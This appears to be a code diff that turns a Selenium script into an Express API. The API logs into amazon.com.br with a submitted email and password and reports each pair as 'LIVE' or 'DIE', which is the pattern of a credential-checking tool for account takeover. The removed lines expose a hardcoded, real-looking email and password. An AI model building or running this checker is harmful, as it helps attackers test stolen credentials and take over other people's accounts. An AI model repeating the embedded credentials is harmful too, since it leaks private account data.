@@ -1,8 +1,23 @@
+import express from 'express';
 import { Builder, By, until } from 'selenium-webdriver';
 import chrome from 'selenium-webdriver/chrome.js';
+import bodyParser from 'body-parser';
 import picocolors from 'picocolors';
 
-(async function loginAutomation() {
+const app = express();
+const port = 5000;
+
+// Middleware para processar JSON
+app.use(bodyParser.json());
+
+// Endpoint para checar login
+app.post('/api/check-login', async (req, res) => {
+    const { email, password } = req.body;
+
+    if (!email || !password) {
+        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
+    }
+
     let options = new chrome.Options();
     options.addArguments('--log-level=3');
     options.addArguments('--disable-logging');
@@ -10,13 +25,9 @@ import picocolors from 'picocolors';
 
     let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();
 
-    const email = 'verxcristovao@gmail.com';
-    const senha = 'yashiro191';
-
     try {
         // ================= MAIN PAGE TO LOGIN =======================
         await driver.get('https://www.amazon.com.br/');
-
         let loginButton = await driver.wait(until.elementLocated(By.id('nav-link-accountList')), 10000);
         await loginButton.click();
 
@@ -26,41 +37,44 @@ import picocolors from 'picocolors';
 
         await inputEmail.sendKeys(email);
         await continueButton.click();
+        await driver.sleep(5000);
 
-        await driver.sleep(5000)
-
+        // Verificar se o email existe
         let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
         let text = await textElement.getText();
 
-        if(text.includes('Não encontramos uma conta associada a este endereço de e-mail')){
-            console.log(picocolors.red(`[ DIE ] » ${email} » [ Não encontramos uma conta associada a este endereço de e-mail  ] @yashirocoder`))
-        }
-        else {
-
-            await driver.sleep(2000)
-
+        if (text.includes('Não encontramos uma conta associada a este endereço de e-mail')) {
+            console.log(picocolors.red(`[ DIE ] » ${email} » [ Não encontramos uma conta associada a este endereço de e-mail ]`));
+            return res.json({ status: 'DIE', message: `Email inválido: ${email}` });
+        } else {
+            // ================== INSERT PASSWORD =====================
             let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
-            let loginButton = await driver.wait(until.elementLocated(By.id('auth-signin-button')), 10000)
+            let loginButton = await driver.wait(until.elementLocated(By.id('auth-signin-button')), 10000);
 
-            await inputPassw.sendKeys(senha)
-            await loginButton.click()
+            await inputPassw.sendKeys(password);
+            await loginButton.click();
+            await driver.sleep(2000);
 
-            await driver.sleep(2000)
+            textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
+            text = await textElement.getText();
 
-            let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
-            let text = await textElement.getText();
-
-            if(text.includes('Sua senha está incorreta')){
-                console.log(picocolors.red(`[ DIE ] » ${email} » [ Login invalido ] @yashirocoder`))
-            }
-            else {
-                console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login valido ] @yashirocoder`))
+            if (text.includes('Sua senha está incorreta')) {
+                console.log(picocolors.red(`[ DIE ] » ${email} » [ Login inválido ]`));
+                return res.json({ status: 'DIE', message: `Login inválido para: ${email}` });
+            } else {
+                console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
+                return res.json({ status: 'LIVE', message: `Login bem-sucedido para: ${email}` });
             }
         }
-
     } catch (error) {
-        console.log(picocolors.red(`[ ERROR ] » ${email} » [ Houve um erro ao tentar checar: ${error} ] @yashirocoder`))
+        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Houve um erro: ${error.message} ]`));
+        return res.status(500).json({ error: `Erro ao verificar o login: ${error.message}` });
     } finally {
         await driver.quit();
     }
-})();
+});
+
+// Iniciar o servidor
+app.listen(port, () => {
+    console.log(`API rodando em http://localhost:${port}`);
+});
